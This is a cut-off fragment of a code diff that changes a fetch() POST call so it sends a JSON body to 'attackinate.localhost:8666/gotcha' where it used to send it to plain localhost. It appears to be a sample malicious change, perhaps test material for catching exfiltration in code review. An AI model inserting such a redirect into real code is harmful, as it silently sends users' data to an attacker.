@@ -1,4 +1,4 @@
-fetch("http://localhost:8666/", {
+fetch("http://attackinate.localhost:8666/gotcha", {
   method: "POST", headers: {
     'Content-Type': 'application/json'
   }, body: JSON.stringify({
